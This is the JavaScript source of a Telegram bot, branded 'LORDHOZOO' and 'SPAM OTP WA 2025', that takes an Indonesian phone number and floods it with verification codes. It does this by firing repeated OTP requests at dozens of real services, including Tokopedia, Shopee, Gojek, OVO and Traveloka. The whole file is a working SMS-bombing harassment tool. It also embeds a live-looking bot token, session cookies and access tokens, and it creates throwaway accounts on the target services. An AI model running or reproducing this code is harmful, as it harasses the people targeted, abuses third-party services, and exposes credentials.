const { Telegraf } = require('telegraf');
const axios = require('axios');
const readline = require('readline');
const bot = new Telegraf('8109698197:AAFksLBRURP3t5AcOLEJs3MCzwOLU2wzV9M');
const merah = '\x1b[31m';
const putih = '\x1b[37m';
const hijau = '\x1b[32m';
const poto = "https://vt.tiktok.com/ZShCYs4o4/";
const botInfo = `
┏━━ıllıllı◌LORDHOZOO◌ıllıllı━━╼
┃  𝐁𝐨𝐭 𝐍𝐚𝐦𝐞: LORDHOZOO
┃ 𝐎𝐖𝐍𝐄𝐑 𝐍𝐀𝐌𝐄: @LORDHOZOO
┃ $𝐑𝐀𝐌: ${(process.memoryUsage().heapUsed / 1024 / 1024).toFixed(2)} MB
┃ $𝐃𝐀𝐓𝐄: ${new Date().toLocaleString()}
╚═══❖•ೋ°👸°ೋ•❖═══╝
＼／＼／＼／＼／＼／＼／＼／＼／`;
const mainMenu = `
${poto} 
┏━━━•❅•°•❈👑❈•°•❅•━━━┓
╚»★ 𖤍SPAM OTP WA 2025𖤍★«╝
║ /start - Start bot
║ /phone +62 [nomor] - Masukkan nomor 
║ /stop - Stop spam
┗━━━•❅•°•❈💀❈•°•❅•━━━┛
     ⇆ㅤ◁ㅤ ❚❚ㅤ ▷ㅤ↻`;
const misteraladinUrl = "https://m.misteraladin.com/api/members/v2/otp/request";
const misteraladinHeaders = {
    "Host": "m.misteraladin.com",
    "accept-language": "id",
    "sec-ch-ua-mobile": "?1",
    "content-type": "application/json",
    "accept": "application/json, text/plain, */*",
    "user-agent": "Mozilla/5.0 (Linux; Android 11; CPH2325) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/94.0.4606.85 Mobile Safari/537.36",
    "x-platform": "mobile-web",
    "sec-ch-ua-platform": "Android",
    "origin": "https://m.misteraladin.com",
    "sec-fetch-site": "same-origin",
    "sec-fetch-mode": "cors",
    "sec-fetch-dest": "empty",
    "referer": "https://m.misteraladin.com/account",
    "accept-encoding": "gzip, deflate, br",
};

// Track active spam processes
const activeSpams = new Set();

async function sendSpam(nomor) {
    const b = nomor.slice(1, 12);
    const c = "62" + b;
    let RTO_flag = 0;
    
    for (let i = 0; i < 10; i++) {
        if (!activeSpams.has(nomor)) {
            break; // Stop if spam was cancelled
        }
        
        try {
            // Make all the requests here including Mister Aladin
            const requests = [
                axios.get(`https://core.ktbs.io/v2/user/registration/otp/${nomor}`),
                axios.post("https://api.klikwa.net/v1/number/sendotp", 
                    JSON.stringify({"number": "+62" + b}), 
                    {headers: {
                        'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
                        'Authorization': 'Basic QjMzOkZSMzM=',
                        'Content-Type': 'application/json'
                    }}
                ),
                axios.post("https://api.payfazz.com/v2/phoneVerifications", 
                    "phone=0" + nomor,
                    {headers: {
                        "Host": "api.payfazz.com",
                        "content-length": "17",
                        "accept": "*/*",
                        "origin": "https://www.payfazz.com",
                        "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36",
                        "content-type": "application/x-www-form-urlencoded; charset=UTF-8",
                        "referer": "http://www.payfazz.com/register/BEN6ZF74XL",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }}
                ),
                axios.post("https://securedapi.confirmtkt.com/api/platform/register", null, {
                    params: {mobileNumber: nomor},
                    headers: {
                        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.11 (KHTML, like Gecko) Chrome/23.0.1271.64 Safari/537.11',
                        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
                        'Accept-Charset': 'ISO-8859-1,utf-8;q=0.7,*;q=0.3',
                        'Accept-Encoding': 'none',
                        'Accept-Language': 'en-US,en;q=0.8',
                        'Connection': 'keep-alive'
                    }
                }),
                axios.post("https://www.matahari.com/rest/V1/thorCustomers/registration-resend-otp", 
                    JSON.stringify({"otp_request":{"mobile_number":nomor,"mobile_country_code":"+62"}}),
                    {headers: {
                        "Host": "www.matahari.com",
                        "content-length": "76",
                        "x-newrelic-id": "Vg4GVFVXDxAGVVlVBgcGVlY=",
                        "sec-ch-ua-mobile": "?1",
                        "user-agent": "Mozilla/5.0 (Linux; Android 9; Redmi 6A) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.0.0 Mobile Safari/537.36",
                        "content-type": "application/json",
                        "accept": "*/*",
                        "x-requested-with": "XMLHttpRequest",
                        "sec-ch-ua-platform": "Android",
                        "origin": "https://www.matahari.com",
                        "sec-fetch-site": "same-origin",
                        "sec-fetch-mode": "cors",
                        "sec-fetch-dest": "empty",
                        "referer": "https://www.matahari.com/customer/account/create/",
                        "accept-encoding": "gzip, deflate, br",
                        "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }}
                ),
                axios.post("https://battlefront.danacepat.com/v1/auth/common/phone/send-code", 
                    {mobile_no: b},
                    {headers: {
                        'user-agent': 'Android/9;vivo/vivo 1902;KtaKilat/3.7.5;Device/;Android_ID/590bc36d99d6dddb;Channel/google_play;Ga_ID/bce68810-4f8a-4675-9452-e0d8565c9a50'
                    }}
                ),
                axios.get("https://appapi.pinjamindo.co.id/api/v1/custom/send_verify_code?mobile=62" + b + "&af_id=1603255661130-6766273395770306663&app=pinjamindo&b=vivo&c=GooglePlay&gaid=bce68810-4f8a-4675-9452-e0d8565c9a50&instance_id=eEARw8yXQImtIANt3oU0zh&is_root=0&l=in&m=vivo 1902&os=android&r=9&sdk=28&simulator=0&t=1432349188&v=10011&sign=46565D573B5BB08099A60A3414F265550092E215"),
                axios.post("https://api.jumpstart.id/graphql", 
                    JSON.stringify({
                        "operationName": "CheckPhoneNoAndGenerateOtpIfNotExist",
                        "variables": {"phoneNo": "+62" + b},
                        "query": "query CheckPhoneNoAndGenerateOtpIfNotExist($phoneNo: String!) {\n  checkPhoneNoAndGenerateOtpIfNotExist(phoneNo: $phoneNo)\n}\n"
                    }),
                    {headers: {
                        'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36',
                        'content-type': 'application/json'
                    }}
                ),
                axios.post("https://api.asani.co.id/api/v1/send-otp", 
                    JSON.stringify({"phone": "62" + b, "email": "akuntesnuyul@gmail.com"}),
                    {headers: {
                        'user-agent': 'Mozilla/5.0 (Linux; Android 9; vivo 1902) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/74.0.3729.136 Mobile Safari/537.36'
                    }}
                ),
                axios.put("https://webapi.depop.com/api/auth/v1/verify/phone", 
                    JSON.stringify({"phone_number": nomor, "country_code": "ID"}),
                    {headers: {
                        "Host": "webapi.depop.com",
                        "accept": "application/json, text/plain, */*",
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
                        "Content-Type": "application/json",
                        "Accept-Encoding": "gzip, deflate, br", 
                        "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                    }}
                ),
                // Mister Aladin OTP request
                axios.post(misteraladinUrl,
                    JSON.stringify({"phone_number": "+62" + b}),
                    {headers: misteraladinHeaders}
                ),
                // Additional OTP APIs
                axios.post("https://api.tiket.com/users/otp",
                    JSON.stringify({"emailOrPhone": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.blibli.com/v3/user/otp/send",
                    JSON.stringify({"phoneNumber": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.bukalapak.com/v2/authentications",
                    JSON.stringify({"phone_number": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.tokopedia.com/auth/v1/otp/send",
                    JSON.stringify({"phone": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.ovo.id/v1.1/api/auth/customer/login2FA",
                    JSON.stringify({"mobile": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.dana.id/api/v1/users/sendLoginOTP",
                    JSON.stringify({"mobile": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.linkaja.id/auth/v1/otp/request",
                    JSON.stringify({"msisdn": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.shopee.co.id/api/v2/otp/send",
                    JSON.stringify({"phone": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.zalora.co.id/v1/otp/send",
                    JSON.stringify({"phone": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                ),
                axios.post("https://api.lazada.co.id/rest/otp/send",
                    JSON.stringify({"phone": nomor}),
                    {headers: {
                        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                        "Content-Type": "application/json"
                    }}
                )
            ];

            await Promise.all(requests);
            
            console.log(`${hijau}Sukses Mengirim Spam ke ${nomor}`);
            await new Promise(resolve => setTimeout(resolve, 120000)); // Wait 2 minutes
            
        } catch (error) {
            if (error.code === 'ECONNABORTED' || error.code === 'ETIMEDOUT') {
                if (RTO_flag === 0) {
                    console.log("");
                    console.log("--Request Time Out--");
                    console.log(`${putih}Proses Automatis dialihkan ke Requests Alternatif${hijau}`);
                }
                
                // Alternative requests including Mister Aladin
                try {
                    const altRequests = [
                        axios.get("https://account-api-v1.klikindomaret.com/api/PreRegistration/SendOTPSMS?NoHP=" + nomor, {
                            headers: {
                                "Host": "account-api-v1.klikindomaret.com",
                                "user-agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "content-type": "application/json",
                                "accept": "*/*",
                                "origin": "https://account.klikindomaret.com",
                                "referer": "https://account.klikindomaret.com/SMSVerification?nohp=" + nomor + "&type=register",
                                "accept-encoding": "gzip, deflate, br",
                                "accept-language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7"
                            }
                        }),
                        axios.post("https://qtva.id/page/frames.php?f=eVBDUVU0NE1DTStQTmgvallDaTA0QT09&p=RUtYZFBydUdXTmVWMUtnc3M1ZmtnVFpMSXRxTWlvQUduaTR6VFZzRk00UT0=&hc=bmFSencyM2FmUWxmckV4Y0pXdEVOQ1pYZW5pY0pXSlBENHZSaCtJNmtTSnR0SHJWeEJaOUhWZHVSUHpRcXhWTg==", 
                            `namaDepan=Tahalu${Math.floor(Math.random() * 99999) + 11}&emailNope=${nomor}&password=Indo${Math.floor(Math.random() * 899) + 111}&konfirmasiPass=Indo${Math.floor(Math.random() * 899) + 111}`,
                            {headers: {
                                "Host": "qtva.id",
                                "Connection": "keep-alive",
                                "Accept": "text/html, */*; q=0.01",
                                "X-Requested-With": "XMLHttpRequest",
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/x-www-form-urlencoded; charset=UTF-8",
                                "Origin": "https://qtva.id",
                                "Referer": "https://qtva.id/page/register/siswa",
                                "Accept-Encoding": "gzip, deflate, br",
                                "Accept-Language": "id-ID,id;q=0.9,en-US;q=0.8,en;q=0.7",
                                "Cookie": "PHPSESSID=7pf5ve6qvjlaeq8lv6ce91mbr4; AWSELB=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; AWSELBCORS=6FCBA14B143B763E16068AD74D58AA579D9D142E7151220D3054E791C33C7FBA3884A9AF7839AD1DD49FFC6622C3A0FA538D30CDE7A17FB6AE724592130CC6587B0B6D0372; _ga=GA1.2.232839318.1597753085; _gid=GA1.2.158794496.1597753085; _gat=1"
                            }}
                        ),
                        axios.post("https://app-api.kredito.id/client/v1/common/verify-code/send", 
                            JSON.stringify({"event":"default_verification","mobilePhone":b,"sender":"jatissms"}),
                            {headers: {
                                "LPR-TIMESTAMP": "1603281035821",
                                "Accept-Language": "id-ID",
                                "LPR-BRAND": "Kredito",
                                "LPR-PLATFORM": "android",
                                "User-Agent": "okhttp/3.11.0 Dalvik/2.1.0 (Linux; U; Android 9; vivo 1902 Build/PPR1.180610.011) AppName/Kredito/v2.6.3 AppChannel/googleplay PlatformType/android",
                                "Authorization": "eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1aWQiOi0xNjAzMjgxMDE3MjAzLCJ1dHlwZSI6ImFub24iLCJleHAiOjE2MDMyODQ2MTd9._HUnW7FQmMiDWvSejS0MBqMq95l2rk_6PuxDeXY5Oks",
                                "LPR-SIGNATURE": "e15dbea8602409df32a2ed5a123dc244",
                                "Content-Type": "application/json; charset=UTF-8",
                                "Content-Length": "79"
                            }}
                        ),
                        axios.post("https://api.gojekapi.com/v5/customers", 
                            {"email": "nsjwwiwiwisnsnn12@gmail.com", "name": "akuinginterbang12", "phone": c, "signed_up_country": "ID"},
                            {headers: {
                                "X-Session-ID": "f8b67b26-c6a4-44d2-9d86-8d93a80901c9", 
                                "X-Platform": "Android", 
                                "X-UniqueId": "8606f4e3b85968fd", 
                                "X-AppVersion": "3.52.2", 
                                "X-AppId": "com.gojek.app", 
                                "Accept": "application/json", 
                                "Authorization": "Bearer", 
                                "X-User-Type": "customer", 
                                "Accept-Language": "id-ID", 
                                "X-User-Locale": "id_ID", 
                                "Host": "api.gojekapi.com", 
                                "Connection": "Keep-Alive", 
                                "Accept-Encoding": "gzip", 
                                "User-Agent": "okhttp/3.12.1"
                            }}
                        ),
                        axios.post("https://harvestcakes.com/register", 
                            {phone: b},
                            {headers: {
                                "user-agent": "Mozilla/5.0 (Linux; Android 5.1.1; SM-G600S Build/LMY47V; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/59.0.3071.125 Mobile Safari/537.36"
                            }}
                        ),
                        axios.post("https://identity-gateway.oyorooms.com/identity/api/v1/otp/generate_by_phone?locale=id", 
                            JSON.stringify({
                                "phone": b,
                                "country_code": "+62",
                                "country_iso_code": "ID",
                                "nod": "4",
                                "send_otp": "true",
                                "devise_role": "Consumer_Guest"
                            }),
                            {headers: {
                                "Host": "identity-gateway.oyorooms.com",
                                "consumer_host": "https://www.oyorooms.com",
                                "accept-language": "id",
                                "access_token": "SFI4TER1WVRTakRUenYtalpLb0w6VnhrNGVLUVlBTE5TcUFVZFpBSnc=",
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML,like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/json",
                                "accept": "*/*",
                                "origin": "https://www.oyorooms.com",
                                "referer": "https://www.oyorooms.com/login",
                                "Accept-Encoding": "gzip,deflate,br"
                            }}
                        ),
                        axios.post("https://foreignadmits.com/api/register-otp-generate-student", 
                            {mobile: `62${nomor.slice(1)}`, countryCode: '+62'}
                        ),
                        // Mister Aladin alternative request
                        axios.post(misteraladinUrl,
                            JSON.stringify({"phone_number": "+62" + b}),
                            {headers: misteraladinHeaders}
                        ),
                        // Additional alternative OTP APIs
                        axios.post("https://api.traveloka.com/v2/user/otp/request",
                            JSON.stringify({"phoneNumber": nomor}),
                            {headers: {
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/json"
                            }}
                        ),
                        axios.post("https://api.pegipagi.com/v1/user/otp/request",
                            JSON.stringify({"phone": nomor}),
                            {headers: {
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/json"
                            }}
                        ),
                        axios.post("https://api.akulaku.com/v1/user/otp/send",
                            JSON.stringify({"phone": nomor}),
                            {headers: {
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/json"
                            }}
                        ),
                        axios.post("https://api.kredivo.com/v2/user/otp/request",
                            JSON.stringify({"phone": nomor}),
                            {headers: {
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/json"
                            }}
                        ),
                        axios.post("https://api.cermati.com/v1/user/otp/send",
                            JSON.stringify({"phone": nomor}),
                            {headers: {
                                "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.106 Mobile Safari/537.36",
                                "Content-Type": "application/json"
                            }}
                        )
                    ];

                    await Promise.all(altRequests);
                    
                    console.log(`${hijau}Sukses Mengirim Spam Alternatif ke ${nomor}`);
                    await new Promise(resolve => setTimeout(resolve, 120000)); // Wait 2 minutes
                    RTO_flag = 1;
                    
                } catch (altError) {
                    console.log("");
                    console.log("--Failed to establish connection--");
                    await new Promise(resolve => setTimeout(resolve, 1000000));
                }
            } else {
                console.log("");
                console.log("Error:", error.message);
                await new Promise(resolve => setTimeout(resolve, 1000000));
            }
        }
    }
}

// Telegram bot commands
bot.start((ctx) => {
    ctx.replyWithPhoto({ url: poto }, { caption: botInfo });
    ctx.reply(mainMenu);
});

bot.command('phone', (ctx) => {
    const phoneNumber = ctx.message.text.split(' ')[1];
    if (!phoneNumber) {
        return ctx.reply('Silakan masukkan nomor telepon setelah /phone. Contoh: /phone +628123456789');
    }
    
    if (!phoneNumber.startsWith('+62')) {
        return ctx.reply('Nomor harus diawali dengan +62 (contoh: +628123456789)');
    }
    
    if (activeSpams.has(phoneNumber)) {
        return ctx.reply(`Spam sudah berjalan untuk nomor ${phoneNumber}`);
    }
    
    activeSpams.add(phoneNumber);
    ctx.reply(`Memulai spam ke nomor ${phoneNumber}...`);
    
    sendSpam(phoneNumber)
        .then(() => {
            activeSpams.delete(phoneNumber);
            ctx.reply(`Selesai mengirim spam ke ${phoneNumber}`);
        })
        .catch(err => {
            console.error(err);
            activeSpams.delete(phoneNumber);
            ctx.reply(`Gagal mengirim spam ke ${phoneNumber}: ${err.message}`);
        });
});

bot.command('stop', (ctx) => {
    const phoneNumber = ctx.message.text.split(' ')[1];
    if (phoneNumber) {
        if (activeSpams.has(phoneNumber)) {
            activeSpams.delete(phoneNumber);
            ctx.reply(`Menghentikan spam untuk nomor ${phoneNumber}`);
        } else {
            ctx.reply(`Tidak ada spam aktif untuk nomor ${phoneNumber}`);
        }
    } else {
        activeSpams.clear();
        ctx.reply('Menghentikan semua proses spam...');
    }
});

// Start the bot
bot.launch()
    .then(() => console.log('Bot started successfully'))
    .catch(err => console.error('Error starting bot:', err));

// Enable graceful stop
process.once('SIGINT', () => bot.stop('SIGINT'));
process.once('SIGTERM', () => bot.stop('SIGTERM'));
